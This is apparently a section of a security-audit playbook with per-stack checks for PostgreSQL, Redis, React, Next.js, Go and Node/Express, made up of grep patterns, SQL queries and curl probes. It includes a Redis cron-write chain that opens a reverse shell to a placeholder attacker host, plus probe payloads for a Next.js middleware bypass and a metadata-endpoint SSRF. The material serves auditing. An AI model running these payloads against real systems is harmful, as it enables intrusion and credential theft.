# Stack-Specific Checks

Team owner: T08 Infra, T04 Input and T11 Client, by section.

Concrete checks for the stacks seen most often. Run the section matching what Phase 0 found. Commands use ripgrep (`rg`). The Grep tool takes the same regexes.

Version floors are not in this file. They moved twice between the first and last draft of this edition. Before any version judgment, run the lookup procedure in `evidence-and-truth.md` and write the fixed version, source and fetch date into the report. The dated ledger there lists what was true on 2026-10-31.

## Contents
- [Run these first](#run-these-first)
- [PostgreSQL](#postgresql)
- [Redis](#redis)
- [React](#react)
- [Next.js](#nextjs)
- [Go](#go)
- [Node.js and Express](#nodejs-and-express)

## Run these first

Two critical issues from late 2025 outrank most of this file. The details below come from the earlier edition and were not re-fetched. Confirm on the vendor advisory.

React2Shell (CVE-2025-55182, with CVE-2025-66478 for Next.js): unauthenticated remote code execution through deserialization of React Server Function payloads, exploited in the wild. Upgrading is the only fix. If the app ran online and unpatched after the disclosure in early December 2025, treat its secrets as disclosed and rotate them. Follow-up flaws in the same code (a denial of service whose first fix was incomplete, and a source disclosure of Server Functions) mean one upgrade might not be enough. Use the latest fixed release from the current advisory.

```bash
npm ls react-server-dom-webpack react-server-dom-parcel react-server-dom-turbopack
```

RediShell (CVE-2025-49844): a use-after-free in the Redis Lua interpreter reaches native code execution from a specially built `EVAL`. It needs authentication in theory. Redis ships without authentication by default, and the official Docker image turns protected mode off, so it often needs none in practice.

## PostgreSQL

Look up the current fixed release for your major version on the PostgreSQL security page. In 2026 two batches shipped (2026-02 and 2026-05), with CVE-2026-2005 (a pgcrypto heap overflow reachable through attacker-supplied ciphertext) in the first. PostgreSQL 13 reached end of life in 2026-05 per secondary reports. Any release line without a fixed version is a finding.

Trust authentication. Any matching client logs in as any role, without a password. Tutorials start here and people copy it to servers.

```sql
SELECT line_number, type, database, user_name, address, auth_method
FROM pg_hba_file_rules WHERE auth_method IN ('trust','password','ident','md5');
```

```bash
rg -n 'POSTGRES_HOST_AUTH_METHOD\s*[:=]\s*trust' -g '*.yml' -g '*.yaml' -g 'Dockerfile*'
```

App connecting as superuser. SQL injection then becomes host compromise through `COPY ... FROM PROGRAM`, and `rolbypassrls` voids every RLS policy.

```sql
SELECT rolname, rolsuper, rolbypassrls, rolcreaterole, rolcreatedb
FROM pg_roles WHERE rolcanlogin AND (rolsuper OR rolbypassrls OR rolcreaterole);
```

Missing TLS. libpq defaults to `sslmode=prefer`, which falls back to plaintext without a warning. `require` encrypts and does not authenticate the server. Only `verify-full` does both.

```bash
rg -n 'sslmode=(disable|allow|prefer)'
rg -n 'rejectUnauthorized\s*:\s*false'
```

The public schema trap. PG15 revoked `CREATE` on `public` from `PUBLIC`. `pg_dump` and `pg_upgrade` keep the old open ACL, so an upgraded cluster looks modern and stays open.

```sql
SELECT has_schema_privilege('public','public','CREATE') AS public_can_create;   -- true is the finding
ALTER SCHEMA public OWNER TO pg_database_owner;
REVOKE CREATE ON SCHEMA public FROM PUBLIC;
```

`SECURITY DEFINER` functions without a pinned `search_path`:

```sql
SELECT n.nspname, p.proname, pg_get_userbyid(p.proowner) AS owner
FROM pg_proc p JOIN pg_namespace n ON n.oid = p.pronamespace
WHERE p.prosecdef AND n.nspname NOT IN ('pg_catalog','information_schema')
  AND (p.proconfig IS NULL OR NOT EXISTS (
       SELECT 1 FROM unnest(p.proconfig) c WHERE c LIKE 'search_path=%'));
```

Fix with `ALTER FUNCTION f() SET search_path = pg_catalog, pg_temp;`. Keep `pg_temp` last, or a temp table shadows a name.

Also check: `listen_addresses = '*'` with a published `5432:5432` port, `statement_timeout` and `idle_in_transaction_session_timeout` left at `0`, `password_encryption` still `md5` on clusters upgraded from 13 or earlier, and RLS with `FORCE` on multi-tenant tables.

## Redis

Look up fixed releases on the Redis security advisories page. A 2026-05 advisory (five CVEs, fixed in the 6.2, 7.2, 7.4, 8.2, 8.4 and 8.6 lines) covered flaws in client unblocking and `RESTORE`, and reports say these need an authenticated user. A later batch might exist.

The highest-value check is an unauthenticated ping from off the host:

```bash
redis-cli -h <host> -p 6379 PING     # PONG means unauthenticated. NOAUTH is the right answer.
```

Three causes compound: no authentication by default, the Docker image turning protected mode off, and `bind 0.0.0.0` as the usual fix for "connection refused". Mining botnets scan port 6379 all the time.

```bash
rg -n '^\s*bind\s+.*(0\.0\.0\.0|\*)' -g 'redis.conf'
rg -n '^\s*protected-mode\s+no' -g 'redis.conf'
rg -n 'ALLOW_EMPTY_PASSWORD\s*[:=]\s*["\x27]?yes' -g '*.yml' -g '*.yaml'
redis-cli CONFIG GET requirepass     # empty value is the finding
redis-cli ACL LIST                   # "default on nopass ~* &* +@all" is wide open
```

Protected mode is not authentication. It refuses non-loopback clients only when no password and no explicit bind exist. `bind 0.0.0.0` turns its protection off while `protected-mode yes` stays in the file, which reads as safe and is not.

The classic chain. With `CONFIG` reachable, an attacker writes a file as the Redis user and gains a shell:

```
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker/443 0>&1\n\n"
SAVE
```

Variants use `MODULE LOAD`, or `REPLICAOF` toward a rogue master which ships a module. Check whether `CONFIG`, `MODULE` and `DEBUG` are reachable, and whether Redis runs as root. Prefer ACL users over the legacy `rename-command`:

```
ACL SETUSER default off
ACL SETUSER appuser on >PASS ~app:* +@read +@write -@admin -@dangerous -@scripting
```

## React

Secrets in the built bundle. Any variable with a public prefix (`REACT_APP_`, `VITE_`, `NEXT_PUBLIC_`, `GATSBY_`, `EXPO_PUBLIC_`) lands in the bundle at build time. Scan the built output, not only source.

```bash
npm run build
rg -n 'sk-[A-Za-z0-9]{20,}|sk_live_|AKIA[0-9A-Z]{16}|service_role|sb_secret_' dist build .next/static -g '*.js'
```

`dangerouslySetInnerHTML` with a non-literal value and no sanitizer in the module:

```bash
rg -n 'dangerouslySetInnerHTML' -g '*.{js,jsx,ts,tsx}' -g '!node_modules'
rg -l 'DOMPurify|sanitize-html' -g '*.{js,jsx,ts,tsx}'       # absence is the finding
```

Markdown which turns raw HTML back on: `rehype-raw`, `allowDangerousHtml`, and `marked` or `markdown-it` with `html: true`.

```bash
rg -n 'rehype-raw|rehypeRaw|allowDangerousHtml' -g '*.{js,jsx,ts,tsx}'
```

Client-side-only authorization. A hidden button is not a control. Each hit is a lead. The decisive test is a request with a low-privilege token which skips the UI.

Source maps in production rebuild original source, comments and internal routes:

```bash
curl -sI https://target/static/js/main.abc123.js.map | head -1
```

Also check `javascript:` and `data:` URLs reaching `href`, and `postMessage` listeners with no `event.origin` check.

## Next.js

Look up the fixed versions for your line on the Next.js blog security posts. In 2026 the project moved to a pre-announced monthly security release program, and an out-of-band release on 2026-10-14 raised the floor above the July release. Versions 13.x and 14.x have no patched release per the project. A repo on a line which stopped receiving patches needs a move to a supported line, not a bump inside its own. A repo which took the December 2025 fixes and nothing since is still exposed to later high-severity issues.

Being between the December fix and the current floor also means the app might have been exploitable earlier, so apply the secret-rotation rule from the first section.

Middleware bypasses recur. CVE-2025-29927 (the `x-middleware-subrequest` header) skipped middleware entirely, and CVE-2026-64642 (July 2026) bypassed it under a narrow i18n and Turbopack configuration. Do not rely on middleware as the only authorization layer.

```bash
curl -sI https://target/protected -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
# 200 where 302 or 401 belongs means vulnerable
```

Server Actions are public HTTP endpoints. Every `"use server"` function takes a hand-built POST. The call site looks like a local function call, which is why the auth check gets forgotten. A 2026 advisory (CVE-2026-64643) discloses action endpoint ids. This is the most common serious App Router flaw.

```bash
rg -l '^\s*["\x27]use server["\x27]' -g '*.{ts,tsx,js,jsx}'
rg -o --pcre2 'createServerReference\(\s*["\x27][0-9a-f]{40}' -g '*.js' .next/static/
```

Do not decide a handler is protected by grepping for the word "auth". A `// TODO: add auth check` comment passes this search. Require a call or an import, and check per function, since one guarded action hides unguarded siblings:

```bash
rg -l 'export\s+(?:async\s+function|const)\s+(?:GET|POST|PUT|PATCH|DELETE)' -g 'route.{ts,js}' . |
while read -r f; do
  rg -q --pcre2 '(?:await\s+)?(?:auth|getServerSession|currentUser|getSession|requireUser|verifySession|getToken|getAuth)\s*\(|from\s+["\x27](?:next-auth|@clerk/|@auth/|@supabase/auth)' "$f" || echo "NO-AUTH: $f"
done
```

Every action body needs authentication and object-level authorization, the same as a route.

Check `ignoreBuildErrors` and `ignoreDuringBuilds`. AI scaffolds set them, and they remove the type and lint errors which would have caught several classes above:

```bash
rg -n --pcre2 '(?:ignoreBuildErrors|ignoreDuringBuilds)\s*:\s*true' -g 'next.config.*'
```

Server to client boundary leaks. Passing a whole database row to a Client Component serializes every field into the page payload, including `passwordHash`. Check the served response:

```bash
curl -s https://target/page | rg -o 'passwordHash|password_hash|stripeCustomerId|sk_live'
```

Fix with `import 'server-only'` in server modules and explicit field selection.

Image optimization. A wildcard `remotePatterns` hostname makes `/_next/image` an open proxy. The October 2026 critical advisory involved image processing of SVG input through the `sharp` library. Check both.

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  'https://target/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75'
```

Run this only against a target you own.

## Go

Run both tools. They do not overlap. `govulncheck` asks whether a known-vulnerable function is reachable from your code, which removes most CVE-list noise. `gosec` asks whether your own code holds a risky pattern, and needs tuning.

```bash
govulncheck ./...
gosec -fmt=sarif -out=gosec.sarif -exclude-generated ./...
```

- G402, `InsecureSkipVerify: true`: encrypted and unauthenticated. Added to silence a staging certificate error, then merged.
- SQL built with `fmt.Sprintf`: `database/sql` supports placeholders. Dynamic filters and sort orders push people to string building.

```bash
rg -n '(Query|QueryRow|Exec)\w*\(\s*(ctx\s*,\s*)?fmt\.Sprintf' --type go
```

- Missing `http.Server` timeouts: `http.ListenAndServe(":8080", h)` builds a server with infinite timeouts. A few hundred slow connections exhaust it. `ReadHeaderTimeout` is the Slowloris defense.

```bash
rg -n 'http\.ListenAndServe\(' --type go
rg -n 'ReadHeaderTimeout|ReadTimeout|WriteTimeout' --type go     # absence is the finding
```

- G304, path traversal: `filepath.Join` calls `Clean`, which resolves `..`. It does not confine the result to a base directory. Go 1.24 added `os.OpenRoot`, which confines by construction. Check your Go version before you recommend it.
- G404, `math/rand` for security values: auto-seeding since Go 1.20 removed the "same token every restart" symptom and left values predictable.

```bash
rg -l '"math/rand' --type go | xargs rg -ln 'token|secret|key|session|otp|nonce' -i
```

## Node.js and Express

Look up supported release lines and the latest security releases on the Node.js vulnerability blog. Node 18 and 20 are end of life. A security release on 2026-10-21 covered the 22, 24 and 26 lines per secondary reports.

CORS with a reflected origin and credentials. `origin: true` reflects the request `Origin`. With `credentials: true`, any site makes authenticated cross-origin requests and reads the replies. The browser blocks `*` here. It does not block a reflected origin.

```bash
curl -sI https://target/api/me -H 'Origin: https://evil.example' | rg -i 'access-control-allow-(origin|credentials)'
```

A reflected `https://evil.example` next to `allow-credentials: true` is the finding.

No rate limit on auth routes. See the rig in `dast-and-authz.md`. Behind a proxy, set `app.set('trust proxy', 1)` to the real hop count. `trust proxy: true` lets clients spoof `X-Forwarded-For` and defeat the limiter.

express-session defaults. `MemoryStore` leaks memory, is unfit for production and breaks sessions across workers. Check `httpOnly`, `secure`, `sameSite`, `saveUninitialized: false`, a real store, and a secret with no literal fallback:

```bash
rg -n 'secret\s*:\s*process\.env\.\w+\s*\|\|\s*["\x27]' --type js --type ts
```

Call `req.session.regenerate()` at login to stop fixation.

JWT verification. Three common bugs: `jwt.decode()` where `verify()` was meant, `verify()` with no `algorithms` option, and a weak or hardcoded secret.

```bash
rg -n 'jwt\.decode\(' --type js --type ts
rg -n 'jwt\.verify\((?:(?!algorithms).){0,200}\)' -P --type js --type ts
```

Prototype pollution. A recursive merge of attacker JSON writes to `Object.prototype`. `body-parser` with `extended: true` uses `qs`, which parses the deeply nested shapes which deliver it.

```bash
rg -n '(_\.|lodash\.)(merge|mergeWith|defaultsDeep)\(' --type js --type ts
rg -n 'Object\.assign\(\s*(\{\}\s*,\s*)?req\.(body|query)' --type js --type ts
```

`child_process` with user input. `exec` spawns a shell, so any interpolated value is command injection. It is rare and nearly always Critical. Use `execFile` with an argument array.

Also check: missing `helmet`, `res.sendFile` with no `root` option, `express.static` serving the project root (which exposes `.env` and `.git/`), and JWTs in `localStorage`.
